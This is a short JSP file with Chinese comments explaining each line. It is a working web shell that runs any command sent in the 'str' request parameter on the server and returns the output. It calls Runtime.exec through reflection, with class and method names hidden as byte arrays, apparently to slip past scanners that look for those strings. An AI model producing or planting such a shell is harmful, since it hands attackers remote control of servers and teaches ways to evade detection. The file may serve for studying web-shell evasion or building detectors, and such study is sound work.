<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Scanner" %>

<%
    String str = request.getParameter("str");

    // 定义"java.lang.Runtime"字符串变量
    String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101});

    // 反射java.lang.Runtime类获取Class对象
    Class<?> c = Class.forName(rt);

    // 反射获取Runtime类的getRuntime方法
    Method m1 = c.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101}));

    // 反射获取Runtime类的exec方法
    Method m2 = c.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);

    // 反射调用Runtime.getRuntime().exec(xxx)方法
    Object obj2 = m2.invoke(m1.invoke(null, new Object[]{}), new Object[]{str});

    // 反射获取Process类的getInputStream方法
    Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));
    m.setAccessible(true);

    // 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串
    Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]{})).useDelimiter("\\A");
    String result = s.hasNext() ? s.next() : "";

    // 输出命令执行结果
    out.println(result);
%>